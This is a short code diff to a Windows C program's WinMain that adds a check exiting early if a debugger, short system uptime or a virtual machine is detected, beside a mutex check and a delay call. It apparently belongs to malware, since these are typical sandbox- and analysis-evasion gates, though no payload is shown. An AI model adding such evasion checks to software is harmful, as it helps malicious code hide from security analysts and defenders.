@@ -12,9 +12,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     if (!check_mutex()) return 0;
 
-
     // TODO: FIX RESOURCE CHECK
     // if (!check_resources()) return 0;
+
+    if (!check_debugger() || !check_uptime() || !check_vm()) return 0;
 
     smart_delay();
 
